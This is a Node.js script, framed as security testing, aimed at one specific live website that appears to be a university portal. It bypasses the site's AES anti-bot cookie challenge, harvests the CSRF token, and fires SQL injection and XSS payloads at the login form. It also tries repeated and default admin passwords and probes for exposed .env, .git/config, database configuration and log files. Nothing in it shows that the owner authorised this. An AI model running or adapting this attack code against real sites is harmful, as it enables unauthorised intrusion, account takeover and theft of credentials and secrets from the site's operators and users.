const https = require('https');
const crypto = require('crypto');

function toNumbers(d) {
  const e = [];
  d.replace(/(..)/g, function(d) { e.push(parseInt(d, 16)); });
  return e;
}

function toHex(d) {
  let e = "";
  for (let f = 0; f < d.length; f++) e += (16 > d[f] ? "0" : "") + d[f].toString(16);
  return e.toLowerCase();
}

function slowAESDecrypt(c, mode, a, b) {
  const key = Buffer.from(a);
  const iv = Buffer.from(b);
  const decipher = crypto.createDecipheriv('aes-128-cbc', key, iv);
  let decrypted = decipher.update(Buffer.from(c));
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return Array.from(decrypted);
}

function makeRequest(url, cookie = '') {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Cookie': cookie
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    req.end();
  });
}

function makePostRequest(url, body, cookie = '', referer = '') {
  return new Promise((resolve, reject) => {
    const urlObj = new URL(url);
    const bodyStr = typeof body === 'string' ? body : new URLSearchParams(body).toString();
    const options = {
      hostname: urlObj.hostname,
      path: urlObj.pathname + urlObj.search,
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(bodyStr),
        'Cookie': cookie,
        'Referer': referer
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }));
    });
    req.on('error', reject);
    req.write(bodyStr);
    req.end();
  });
}

async function bypassAntiBot() {
  console.log('=== STEP 1: Get anti-bot challenge ===');
  const res1 = await makeRequest('https://pklubsiv2.rf.gd/login');
  console.log('Status:', res1.status);
  
  const am = res1.body.match(/toNumbers\("([0-9a-f]+)"\)/g);
  if (!am || am.length < 3) {
    console.log('No anti-bot challenge found. Body:');
    console.log(res1.body.substring(0, 500));
    return null;
  }
  
  const aHex = am[0].match(/"([0-9a-f]+)"/)[1];
  const bHex = am[1].match(/"([0-9a-f]+)"/)[1];
  const cHex = am[2].match(/"([0-9a-f]+)"/)[1];
  
  console.log('a:', aHex);
  console.log('b:', bHex);
  console.log('c:', cHex);
  
  const a = toNumbers(aHex);
  const b = toNumbers(bHex);
  const c = toNumbers(cHex);
  
  const decrypted = slowAESDecrypt(c, 2, a, b);
  const cookieValue = toHex(decrypted);
  console.log('__test cookie:', cookieValue);
  
  return '__test=' + cookieValue;
}

async function runSecurityTests() {
  console.log('\n========================================');
  console.log('SECURITY TESTING - pklubsiv2.rf.gd');
  console.log('========================================\n');
  
  // Step 1: Bypass anti-bot
  const cookie = await bypassAntiBot();
  if (!cookie) {
    console.log('Failed to bypass anti-bot. Trying direct access...');
  }
  
  const results = {};
  const baseUrl = 'https://pklubsiv2.rf.gd';
  
  // Step 2: Get actual login page
  console.log('\n=== TEST 1: Access login page ===');
  const loginPage = await makeRequest(baseUrl + '/login', cookie);
  console.log('Status:', loginPage.status);
  console.log('Body length:', loginPage.body.length);
  
  if (loginPage.body.includes('aes.js')) {
    console.log('Still getting anti-bot challenge. Need to follow redirect...');
    const redirectMatch = loginPage.body.match(/location\.href="([^"]+)"/);
    if (redirectMatch) {
      console.log('Redirect to:', redirectMatch[1]);
      const loginPage2 = await makeRequest(baseUrl + redirectMatch[1], cookie);
      console.log('Status:', loginPage2.status);
      console.log('Body length:', loginPage2.body.length);
      console.log('Has login form:', loginPage2.body.includes('name="username"'));
      results.loginPage = loginPage2.body;
    }
  } else {
    console.log('Has login form:', loginPage.body.includes('name="username"'));
    results.loginPage = loginPage.body;
  }
  
  // Step 3: Extract CSRF token
  console.log('\n=== TEST 2: Extract CSRF token ===');
  const csrfMatch = results.loginPage.match(/name="_token" value="([^"]+)"/);
  const csrfToken = csrfMatch ? csrfMatch[1] : '';
  console.log('CSRF Token found:', csrfToken ? 'Yes (' + csrfToken.substring(0, 20) + '...)' : 'No');
  
  // Step 4: SQL Injection tests
  console.log('\n=== TEST 3: SQL Injection Tests ===');
  const sqlPayloads = [
    { username: "admin' OR '1'='1", password: "test123" },
    { username: "admin'--", password: "test123" },
    { username: "' OR 1=1--", password: "' OR 1=1--" },
    { username: "admin' UNION SELECT 1,2,3--", password: "test" },
  ];
  
  for (const payload of sqlPayloads) {
    try {
      const body = `_token=${encodeURIComponent(csrfToken)}&username=${encodeURIComponent(payload.username)}&password=${encodeURIComponent(payload.password)}&role=admin`;
      const res = await makePostRequest(baseUrl + '/login', body, cookie, baseUrl + '/login');
      console.log(`SQLi "${payload.username}": Status ${res.status}, Redirect: ${res.headers.location || 'none'}, Body includes: ${res.body.includes('SQL') ? 'SQL ERROR!' : res.body.includes('login') ? 'Login page (blocked)' : 'Other'}`);
      // Check if we got redirected to dashboard (meaning SQLi worked)
      if (res.headers.location && res.headers.location.includes('dashboard')) {
        console.log('  *** CRITICAL: SQL Injection may have succeeded! ***');
      }
    } catch (e) {
      console.log(`SQLi "${payload.username}": Error - ${e.message}`);
    }
  }
  
  // Step 5: XSS tests on login form
  console.log('\n=== TEST 4: XSS Tests ===');
  const xssPayloads = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "' onmouseover='alert(1)'",
    '<img src=x onerror=alert(1)>',
  ];
  
  for (const payload of xssPayloads) {
    try {
      const body = `_token=${encodeURIComponent(csrfToken)}&username=${encodeURIComponent(payload)}&password=test&role=admin`;
      const res = await makePostRequest(baseUrl + '/login', body, cookie, baseUrl + '/login');
      const reflected = res.body.includes(payload);
      console.log(`XSS "${payload.substring(0, 30)}": Reflected=${reflected}, Status=${res.status}`);
    } catch (e) {
      console.log(`XSS Error: ${e.message}`);
    }
  }
  
  // Step 6: Brute force test
  console.log('\n=== TEST 5: Brute Force / Rate Limiting ===');
  let blocked = false;
  for (let i = 0; i < 8; i++) {
    try {
      const body = `_token=${encodeURIComponent(csrfToken)}&username=admin&password=wrong${i}&role=admin`;
      const res = await makePostRequest(baseUrl + '/login', body, cookie, baseUrl + '/login');
      const isThrottled = res.body.includes('throttl') || res.body.includes('Too many') || res.status === 429;
      const hasCaptcha = res.body.includes('captcha') || res.body.includes('Captcha');
      console.log(`Attempt ${i+1}: Status=${res.status}, Throttled=${isThrottled}, HasCaptcha=${hasCaptcha}`);
      if (isThrottled || res.status === 429) { blocked = true; break; }
    } catch (e) {
      console.log(`Attempt ${i+1}: Error - ${e.message}`);
    }
  }
  console.log('Rate limiting active:', blocked ? 'YES' : 'NO - VULNERABLE');
  
  // Step 7: Sensitive file access
  console.log('\n=== TEST 6: Sensitive File Access ===');
  const sensitivePaths = [
    '/.env',
    '/.env.production',
    '/composer.json',
    '/composer.lock',
    '/storage/logs/laravel.log',
    '/public/setup.php',
    '/phpinfo.php',
    '/.git/config',
    '/app/Http/Controllers/Auth/LoginController.php',
    '/config/database.php',
    '/.htaccess',
  ];
  
  for (const path of sensitivePaths) {
    try {
      const res = await makeRequest(baseUrl + path, cookie);
      const bodyPreview = res.body.substring(0, 100).replace(/\n/g, ' ');
      const isExposed = res.status === 200 && !res.body.includes('aes.js') && res.body.length > 0;
      console.log(`${path}: Status=${res.status}, Exposed=${isExposed}, Preview: ${bodyPreview}`);
    } catch (e) {
      console.log(`${path}: Error - ${e.message}`);
    }
  }
  
  // Step 8: Auth bypass - access protected pages without login
  console.log('\n=== TEST 7: Auth Bypass (no login) ===');
  const protectedPaths = [
    '/admin/dashboard',
    '/admin/akun',
    '/dosen/dashboard',
    '/mahasiswa/dashboard',
    '/mentor/dashboard',
    '/admin/akun/create',
    '/admin/proposal',
    '/admin/log',
  ];
  
  for (const path of protectedPaths) {
    try {
      const res = await makeRequest(baseUrl + path, cookie);
      const isLoginRedirect = res.headers.location && res.headers.location.includes('login');
      const hasLoginForm = res.body.includes('name="username"') || res.body.includes('Silakan login');
      const status = res.status;
      console.log(`${path}: Status=${status}, Redirected to login=${isLoginRedirect || hasLoginForm}`);
    } catch (e) {
      console.log(`${path}: Error - ${e.message}`);
    }
  }
  
  // Step 9: Security headers check
  console.log('\n=== TEST 8: Security Headers ===');
  const mainPage = await makeRequest(baseUrl + '/login', cookie);
  const securityHeaders = [
    'X-Content-Type-Options',
    'X-Frame-Options', 
    'X-XSS-Protection',
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'Referrer-Policy',
    'Permissions-Policy',
  ];
  for (const h of securityHeaders) {
    const val = mainPage.headers[h.toLowerCase()];
    console.log(`${h}: ${val || 'NOT SET'}`);
  }
  
  // Step 10: Login with valid credentials to test session
  console.log('\n=== TEST 9: Valid Login Test ===');
  try {
    const body = `_token=${encodeURIComponent(csrfToken)}&username=admin&password=admin123&role=admin`;
    const res = await makePostRequest(baseUrl + '/login', body, cookie, baseUrl + '/login');
    console.log('Login attempt - Status:', res.status);
    console.log('Location:', res.headers.location || 'none');
    const setCookie = res.headers['set-cookie'];
    console.log('Set-Cookie:', setCookie ? setCookie.substring(0, 80) + '...' : 'none');
    console.log('Body preview:', res.body.substring(0, 200).replace(/\n/g, ' '));
  } catch (e) {
    console.log('Login Error:', e.message);
  }
  
  console.log('\n========================================');
  console.log('SECURITY TEST COMPLETE');
  console.log('========================================');
}

runSecurityTests().catch(console.error);